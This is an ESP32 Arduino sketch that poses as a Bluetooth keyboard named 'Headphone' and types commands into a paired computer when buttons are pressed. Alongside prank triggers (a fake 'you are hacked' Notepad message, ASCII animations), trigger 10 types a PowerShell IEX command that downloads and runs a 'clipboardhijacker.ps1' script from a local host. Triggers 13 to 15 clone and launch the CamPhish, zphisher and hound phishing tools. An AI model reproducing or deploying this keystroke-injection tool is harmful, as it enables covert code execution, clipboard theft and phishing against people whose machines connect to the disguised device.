#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Trigger 1
#define BUTTON_2_PIN 17 // Trigger 2
#define BUTTON_3_PIN 18 // Trigger 3
#define BUTTON_4_PIN 19 // Trigger 4
#define BUTTON_5_PIN 21 // Trigger 5
#define BUTTON_6_PIN 15 // Trigger 6
#define BUTTON_7_PIN 13 // Trigger 7
#define BUTTON_8_PIN 12 // Trigger 8
#define BUTTON_9_PIN 14 // Trigger 9
#define BUTTON_10_PIN 23 // Trigger 10
#define BUTTON_11_PIN 33 // Trigger 11
#define BUTTON_12_PIN 26 // Trigger 12
#define BUTTON_13_PIN 27 // Trigger 13
#define BUTTON_14_PIN 25 // Trigger 14
#define BUTTON_15_PIN 22 // Trigger 15

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;
bool lastState7 = HIGH;
bool lastState8 = HIGH;
bool lastState9 = HIGH;
bool lastState10 = HIGH;
bool lastState11 = HIGH;
bool lastState12 = HIGH;
bool lastState13 = HIGH;
bool lastState14 = HIGH;
bool lastState15 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void sendStringSlow(const char* s, unsigned long charDelayMs = 120) {
  for (size_t i = 0; s[i] != '\0'; ++i) {
    bleKeyboard.print(s[i]);
    delay(charDelayMs);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(300);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
  pinMode(BUTTON_11_PIN, INPUT_PULLUP);
  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
  pinMode(BUTTON_15_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000); // Added delay for stable BLE initialization
  bleKeyboard.begin();
  Serial.println("BLE initialization attempted. Check if 'Headphone' appears on host device.");
  Serial.println("Setup complete!");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    Serial.println("BLE connected!");
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);
    bool state8 = digitalRead(BUTTON_8_PIN);
    bool state9 = digitalRead(BUTTON_9_PIN);
    bool state10 = digitalRead(BUTTON_10_PIN);
    bool state11 = digitalRead(BUTTON_11_PIN);
    bool state12 = digitalRead(BUTTON_12_PIN);
    bool state13 = digitalRead(BUTTON_13_PIN);
    bool state14 = digitalRead(BUTTON_14_PIN);
    bool state15 = digitalRead(BUTTON_15_PIN);

    // Trigger 1: Open Notepad and type a message
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Trigger 1 is running");
      openRun();
      delay(700);
      sendString("notepad");
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(800);
      const char* txt = "Hello From ESP32 - This program created by Sachin Kumar Pandey";
      sendString(txt, 50);
      delay(200);
    }

    // Trigger 2: Open Windows Terminal and run curl parrot.live
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Trigger 2 is running");
      openRun();
      delay(500);
      sendString("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      const char* cmd = "color 2 & curl parrot.live";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 3: Open browser with resume URL
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Trigger 3 is running");
      openRun();
      delay(700);
      const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 4: Open CMD and run ipconfig /all
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Trigger 4 is running");
      openRun();
      delay(300);
      const char* cmd = "cmd";
      sendString(cmd, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);
      const char* action = "ipconfig /all";
      sendString(action, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 5: Open browser with GitHub URL
    if (lastState5 == HIGH && state5 == LOW) {
      Serial.println("Trigger 5 is running");
      openRun();
      delay(500);
      const char* url = "https://github.com/sachinpandey7709";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 6: Open CMD and cycle through colors
    if (lastState6 == HIGH && state6 == LOW) {
      Serial.println("Trigger 6 is running");
      openRun();
      delay(400);
      sendString("cmd", 10);
      delay(150);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("color a", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("color 1", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("color 2", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("exit", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(500);
    }

    // Trigger 7: Open Windows Terminal and run curl ascii.live/forrest
    if (lastState7 == HIGH && state7 == LOW) {
      Serial.println("Trigger 7 is running");
      openRun();
      delay(500);
      sendString("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      const char* cmd = "color 2 & curl ascii.live/forrest";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 8: Open Windows Terminal and run curl ascii.live/donut
    if (lastState8 == HIGH && state8 == LOW) {
      Serial.println("Trigger 8 is running");
      openRun();
      delay(500);
      sendString("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      const char* cmd = "color 2 & curl ascii.live/donut";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 9: Open Notepad and type a message
    if (lastState9 == HIGH && state9 == LOW) {
      Serial.println("Trigger 9 is running");
      openRun();
      delay(1000);
      const char* cmd = "notepad";
      sendString(cmd, 10);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(900);
      const char* txt = "You are hacked by black hat hackers. You are in my control.";
      sendString(txt, 12);
      delay(300);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('f');
      delay(100);
      bleKeyboard.releaseAll();
      delay(300);
      bleKeyboard.press('x');
      delay(100);
      bleKeyboard.releaseAll();
    }

    // Trigger 10: Open Windows Terminal and run a PowerShell script (ETHICAL WARNING)
    if (lastState10 == HIGH && state10 == LOW) {
      Serial.println("Trigger 10 is running (WARNING: Potentially malicious)");
      openRun();
      delay(1000);
      sendString("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(5000);
      const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8081/clipboardhijacker.ps1')";
      sendString(cmd, 50);
      delay(1000);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 11: Open browser with YouTube URL
    if (lastState11 == HIGH && state11 == LOW) {
      Serial.println("Trigger 11 is running");
      openRun();
      delay(700);
      const char* url = "https://youtube.com/@sachinautocad954?si=BuLuBVeXN-xsGonl";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 12: Open Chrome in Windows Terminal and load resume URL
    if (lastState12 == HIGH && state12 == LOW) {
      Serial.println("Trigger 12 is running");
      openRun();
      delay(500);
      sendString("chrome");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 13: Clone and run CamPhish script
    if (lastState13 == HIGH && state13 == LOW) {
      Serial.println("Trigger 13 is running");
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700);
      sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 180);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(6000);
      sendStringSlow("cd CamPhish", 130);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(800);
      sendStringSlow("bash camphish.sh", 130);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 14: Clone and run zphisher script
    if (lastState14 == HIGH && state14 == LOW) {
      Serial.println("Trigger 14 is running");
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700);
      sendStringSlow("git clone --depth=1 https://github.com/htr-tech/zphisher.git", 160);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(6000);
      sendStringSlow("cd zphisher", 130);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(800);
      sendStringSlow("bash zphisher.sh", 130);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 15: Clone and run hound script
    if (lastState15 == HIGH && state15 == LOW) {
      Serial.println("Trigger 15 is running");
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700);
      sendStringSlow("git clone https://github.com/techchipnet/hound", 160);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(6000);
      sendStringSlow("cd hound", 150);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(800);
      sendStringSlow("bash hound.sh", 150);
      delay(3000);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Update last states
    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
    lastState7 = state7;
    lastState8 = state8;
    lastState9 = state9;
    lastState10 = state10;
    lastState11 = state11;
    lastState12 = state12;
    lastState13 = state13;
    lastState14 = state14;
    lastState15 = state15;
  } else {
    Serial.println("Waiting for BLE connection...");
  }

  delay(10);
}
